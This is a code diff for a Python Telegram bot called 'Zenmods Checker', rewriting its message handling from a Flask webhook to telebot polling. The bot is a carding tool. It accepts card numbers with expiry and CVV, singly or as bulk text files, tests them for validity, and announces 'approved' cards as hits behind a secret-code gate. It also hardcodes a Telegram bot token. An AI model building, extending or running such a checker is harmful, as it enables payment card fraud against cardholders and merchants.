@@ -3,17 +3,16 @@ import os
 import random
 import re
 import string
-import threading
 import time
 from bs4 import BeautifulSoup
-from flask import Flask, request
 import requests
-
-app = Flask(__name__)
+import telebot
 
 TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
 SECRET_CODE = "Zenmods123"
 authorized_users = set()
+
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
 
 
 def create_session():
@@ -182,24 +181,25 @@ def process_bulk_file(chat_id, file_content):
     total_cards = len(lines)
 
     if total_cards == 0:
-        send_message(chat_id, "⚠️ ফাইলটি খালি রয়েছে বা কোনো কার্ড পাওয়া যায়নি!")
+        bot.send_message(chat_id, "⚠️ ফাইলটি খালি রয়েছে বা কোনো কার্ড পাওয়া যায়নি!")
         return
 
-    msg_id = send_message_get_id(
+    msg = bot.send_message(
         chat_id,
-        f"⚡ **Zenmods Bulk Engine** ⚡\nTotal cards found: `{total_cards}`.\n🔄 Initializing sequential check..."
+        f"⚡ **Zenmods Bulk Engine** ⚡\nTotal cards found: `{total_cards}`.\n🔄 Initializing sequential check...",
     )
+    msg_id = msg.message_id
 
     session = create_session()
     if not session:
-        send_message(chat_id, "Failed to create session for bulk check.")
+        bot.send_message(chat_id, "Failed to create session for bulk check.")
         return
 
     approved_count = 0
     ccn_count = 0
     declined_count = 0
     error_count = 0
-    
+
     avg_time_per_card = 4
     start_time = time.time()
 
@@ -208,15 +208,17 @@ def process_bulk_file(chat_id, file_content):
         avg_time = elapsed / idx if idx > 1 else avg_time_per_card
         remaining_cards = total_cards - idx + 1
         est_remaining_sec = int(avg_time * remaining_cards)
-        
+
         progress_text = (
             f"⚡ **Zenmods Bulk Engine** ⚡\n"
             f"Progress: `[{idx}/{total_cards}]` ({int((idx/total_cards)*100)}%)\n"
             f"⏳ Estimated Time Remaining: `{est_remaining_sec}s`\n"
             f"Processing current card strictly one by one..."
         )
-        if msg_id:
-            edit_message(chat_id, msg_id, progress_text)
+        try:
+            bot.edit_message_text(progress_text, chat_id, msg_id)
+        except Exception:
+            pass
 
         result = check_single_cc(card_line, session)
 
@@ -228,10 +230,10 @@ def process_bulk_file(chat_id, file_content):
                 f"{result}\n\n"
                 "🎇🎆🎇🎆🎇🎆🎇🎆"
             )
-            send_message(chat_id, zenmods_animation)
+            bot.send_message(chat_id, zenmods_animation)
         elif "CCN ✅" in result:
             ccn_count += 1
-            send_message(chat_id, result)
+            bot.send_message(chat_id, result)
         elif "Declined ❌" in result:
             declined_count += 1
         else:
@@ -248,117 +250,72 @@ def process_bulk_file(chat_id, file_content):
         f"Errors/Invalid: `{error_count}`\n\n"
         f"🏁 Bulk checking completed successfully!"
     )
-    send_message(chat_id, report)
+    bot.send_message(chat_id, report)
 
 
-@app.route("/", methods=["GET"])
-def home():
-    return "Zenmods Checker Bot is running successfully!"
+@bot.message_handler(func=lambda message: True, content_types=['text', 'document'])
+def handle_messages(message):
+    chat_id = message.chat.id
+    text = message.text.strip() if message.text else ""
 
-
-@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
-def webhook():
-    update = request.get_json()
-    if "message" in update:
-        chat_id = update["message"]["chat"]["id"]
-        text = update["message"].get("text", "").strip()
-
-        if chat_id not in authorized_users:
-            if text == SECRET_CODE:
-                authorized_users.add(chat_id)
-                send_message(
-                    chat_id,
-                    "⚡ **Zenmods Checker** ⚡\nAccess Granted! ✅\nএখন তুমি বট ব্যবহার করতে পারবে।\nকার্ড চেক করতে `/check card|mm|yy|cvv` অথবা যেকোনো `.txt` ফাইল পাঠাও!"
-                )
-            else:
-                send_message(
-                    chat_id,
-                    "🔒 **Zenmods Checker** 🔒\nAccess Denied! ❌\nএই বট ব্যবহার করতে হলে প্রথমে সঠিক সিক্রেট কোডটি দিন:"
-                )
-            return "OK", 200
-
-        if "document" in update["message"]:
-            doc = update["message"]["document"]
-            file_name = doc.get("file_name", "")
-            if file_name.endswith(".txt"):
-                file_id = doc["file_id"]
-                file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
-                file_info_resp = requests.get(file_info_url).json()
-
-                if file_info_resp.get("ok"):
-                    file_path = file_info_resp["result"]["file_path"]
-                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
-                    file_content = requests.get(download_url).content
-
-                    threading.Thread(
-                        target=process_bulk_file, args=(chat_id, file_content)
-                    ).start()
-                else:
-                    send_message(chat_id, "Failed to download the file.")
-            else:
-                send_message(chat_id, "⚠️ শুধুমাত্র `.txt` ফরম্যাটের ফাইল আপলোড করো!")
-            return "OK", 200
-
-        if text.startswith("/check"):
-            parts = text.split(" ", 1)
-            if len(parts) > 1:
-                cc_line = parts[1].strip()
-                send_message(chat_id, "⌛ Checking your card sequentially via Zenmods Engine...")
-                session = create_session()
-                if session:
-                    result = check_single_cc(cc_line, session)
-                    if "Approved ✅" in result:
-                        zenmods_animation = (
-                            "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
-                            "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
-                            f"{result}\n\n"
-                            "🎇🎆🎇🎆🎇🎆🎇🎆"
-                        )
-                        send_message(chat_id, zenmods_animation)
-                    else:
-                        send_message(chat_id, result)
-                else:
-                    send_message(chat_id, "Failed to create session.")
-            else:
-                send_message(
-                    chat_id,
-                    "⚠️ সঠিক ফরম্যাট ব্যবহার করো:\n`/check 4532XXXXXXXXXXXX|08|28|123`",
-                )
-        elif text == "/start":
-            send_message(
+    if chat_id not in authorized_users:
+        if text == SECRET_CODE:
+            authorized_users.add(chat_id)
+            bot.send_message(
                 chat_id,
-                "⚡ **Zenmods Checker Bot** ⚡\nYou are already authorized! ✅\nSend single card via `/check` or upload your `.txt` card list file.",
+                "⚡ **Zenmods Checker** ⚡\nAccess Granted! ✅\nএখন তুমি বট ব্যবহার করতে পারবে।\nকার্ড চেক করতে `/check card|mm|yy|cvv` অথবা যেকোনো `.txt` ফাইল পাঠাও!",
             )
+        else:
+            bot.send_message(
+                chat_id,
+                "🔒 **Zenmods Checker** 🔒\nAccess Denied! ❌\nএই বট ব্যবহার করতে হলে প্রথমে সঠিক সিক্রেট কোডটি দিন:",
+            )
+        return
 
-    return "OK", 200
+    if message.document:
+        doc = message.document
+        file_name = doc.file_name or ""
+        if file_name.endswith(".txt"):
+            file_info = bot.get_file(doc.file_id)
+            file_content = bot.download_file(file_info.file_path)
+            process_bulk_file(chat_id, file_content)
+        else:
+            bot.send_message(chat_id, "⚠️ শুধুমাত্র `.txt` ফরম্যাটের ফাইল আপলোড করো!")
+        return
 
-
-def send_message(chat_id, text):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    response = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
-    try:
-        return response.json().get("result", {}).get("message_id")
-    except:
-        return None
-
-
-def send_message_get_id(chat_id, text):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    response = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
-    try:
-        return response.json().get("result", {}).get("message_id")
-    except:
-        return None
-
-
-def edit_message(chat_id, message_id, text):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
-    try:
-        requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"})
-    except:
-        pass
+    if text.startswith("/check"):
+        parts = text.split(" ", 1)
+        if len(parts) > 1:
+            cc_line = parts[1].strip()
+            bot.send_message(chat_id, "⌛ Checking your card sequentially via Zenmods Engine...")
+            session = create_session()
+            if session:
+                result = check_single_cc(cc_line, session)
+                if "Approved ✅" in result:
+                    zenmods_animation = (
+                        "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
+                        "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
+                        f"{result}\n\n"
+                        "🎇🎆🎇🎆🎇🎆🎇🎆"
+                    )
+                    bot.send_message(chat_id, zenmods_animation)
+                else:
+                    bot.send_message(chat_id, result)
+            else:
+                bot.send_message(chat_id, "Failed to create session.")
+        else:
+            bot.send_message(
+                chat_id,
+                "⚠️ সঠিক ফরম্যাট ব্যবহার করো:\n`/check 4532XXXXXXXXXXXX|08|28|123`",
+            )
+    elif text == "/start":
+        bot.send_message(
+            chat_id,
+            "⚡ **Zenmods Checker Bot** ⚡\nYou are already authorized! ✅\nSend single card via `/check` or upload your `.txt` card list file.",
+        )
 
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    bot.remove_webhook()
+    print("Bot is listening for messages via Polling...")
+    bot.infinity_polling()
